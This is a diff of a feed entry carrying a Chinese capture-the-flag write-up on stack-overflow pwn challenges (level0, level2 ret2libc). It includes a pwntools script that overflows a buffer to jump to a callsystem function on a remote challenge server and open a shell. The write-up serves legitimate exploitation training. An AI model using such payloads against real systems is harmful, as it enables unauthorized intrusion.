@@ -29,7 +29,7 @@ NX:内存栈不可执行保护机制，传入栈的数据不可直接执行意�
 跟level0一样的栈溢出漏洞，88h的栈可以写入0x100的数据明显的栈溢出
 查看是否有后门，shift+f12查看字符串，可以发现system函数与/bin/sh字符串
 但是这里的system函数参数没有写，需要我们自己将/bin/sh作为参数传入system函数，考查的是基础ROP中的ret2libc
-ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&amp;quot;/bin/sh&amp;rdquo;)，故而此时我们需要知道 system 函数的地址与字符串/bin/sh的地址
+ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&amp;quot;/bin/sh&amp;quot;)，故而此时我们需要知道 system 函数的地址与字符串/bin/sh的地址
 本题有2个system函数地址，我们需要使用的是_system函数，因为它是属于plt段，若使用extern段的system无法getshell
 我们使用symbols()函数获取的地址是plt段中的_system
 写exp
@@ -49,7 +49,7 @@ ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个�
 拖入IDA分析，F5反编译main函数
 进入vulnerable_function()函数
 漏洞很明显了一个80h的栈可以读入0x200的数据，明显的栈溢出
-我们查看程序有没有后门，shift+f12查看字符串存在callsystem()函数调用system(&amp;quot;/bin/sh&amp;rdquo;)
+我们查看程序有没有后门，shift+f12查看字符串存在callsystem()函数调用system(&amp;quot;/bin/sh&amp;quot;)
 编写exp
 #!/usr/bin/python #coding=UTF-8 from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,45960) elf = ELF(&amp;#39;./level0&amp;#39;) #开启本地程序的句柄 callsystem_addr = elf.symbols[&amp;#39;callsystem&amp;#39;] #symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等 payload = &amp;#39;a&amp;#39;*0x80 + &amp;#39;a&amp;#39;*8 + p64(callsystem_addr) #sh.recv() sh.sendlineafter(&amp;#39;Hello, World\n&amp;#39;,payload)#接收到Hello, World之后传入payload sh.interactive()#接收shell 注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn</description>
     </item>
